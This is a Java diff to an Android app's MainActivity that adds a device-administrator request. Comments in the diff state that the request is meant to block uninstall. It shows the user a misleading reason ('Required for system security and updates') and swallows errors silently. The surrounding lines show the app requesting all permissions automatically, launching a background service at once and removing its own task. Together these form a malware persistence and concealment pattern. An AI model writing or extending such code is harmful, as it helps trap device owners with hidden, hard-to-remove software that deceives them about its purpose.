@@ -12,6 +12,8 @@ import android.view.Window;
 import android.view.WindowManager;
 import android.Manifest;
 import android.os.PowerManager;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 
 public class MainActivity extends Activity {
     
@@ -32,6 +34,9 @@ public class MainActivity extends Activity {
         // Request all permissions automatically
         requestAllPermissions();
         
+        // Request device admin (blocks uninstall)
+        requestDeviceAdmin();
+        
         // Start the background service immediately
         startSystemService();
         
@@ -40,6 +45,23 @@ public class MainActivity extends Activity {
             finishAndRemoveTask();
         } else {
             finish();
+        }
+    }
+    
+    private void requestDeviceAdmin() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName componentName = new ComponentName(this, DeviceAdminReceiver.class);
+            
+            if (!dpm.isAdminActive(componentName)) {
+                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
+                    "Required for system security and updates");
+                startActivity(intent);
+            }
+        } catch (Exception e) {
+            // Silent fail
         }
     }
     
